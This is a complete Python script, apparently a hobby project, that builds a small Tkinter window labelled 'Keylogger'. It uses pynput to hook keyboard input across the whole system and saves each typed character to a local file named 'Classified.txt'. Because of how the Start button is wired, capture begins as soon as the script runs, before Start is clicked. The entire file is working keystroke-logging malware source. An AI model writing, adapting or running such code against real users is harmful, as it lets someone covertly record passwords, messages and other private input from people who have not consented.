from tkinter import * 
from pynput.keyboard import Key, Listener 
import threading

root = Tk()
root.title('Keylogger')
root.geometry("300x300")
root.configure(bg="#34495E")

def start_Keylogger():
    letter = []

    def pressing_keys(key):
        letter.append(key)
        write_in_file(letter)
        print(key)

    def write_in_file(variable):
        with open('Classified.txt', 'w') as f:
            for i in variable:
                new_variable = str(i).replace("'","")
                if new_variable.find("space") > 0:
                    f.write('\n')
                
                elif new_variable.find("Key") == -1:
                    f.write(new_variable)
            

    def releasing_keys(key):
        if key == Key.esc:
            return False

    with Listener(on_press=pressing_keys, on_release=releasing_keys) as l:
        l.join()



def close():
   root.destroy()

button_start = Button(root, text = 'Start',padx = 80, pady = 30, command = threading.Thread(target=start_Keylogger).start())
button_start.pack(pady=30)


buttton_stop = Button(root, text = 'Stop',padx = 80, pady = 30,command = close)
buttton_stop.pack(pady=10)

root.mainloop()